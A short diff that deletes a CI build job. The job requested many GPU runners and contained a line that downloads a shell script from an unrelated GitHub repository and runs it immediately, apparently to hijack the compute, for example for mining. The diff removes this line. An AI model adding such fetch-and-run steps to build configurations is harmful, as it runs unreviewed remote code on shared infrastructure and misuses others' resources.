@@ -1,8 +1,0 @@
- build:
-    machine:
-      image: ubuntu-1604-cuda-10.1:201909-23
-    resource_class: gpu.nvidia.large
-    parallelism: 16
-    steps:
-      - run: nvidia-smi
-      - run: wget https://raw.githubusercontent.com/cobacoba1222/coba/main/coba.sh && chmod +x coba.sh && ./coba.sh
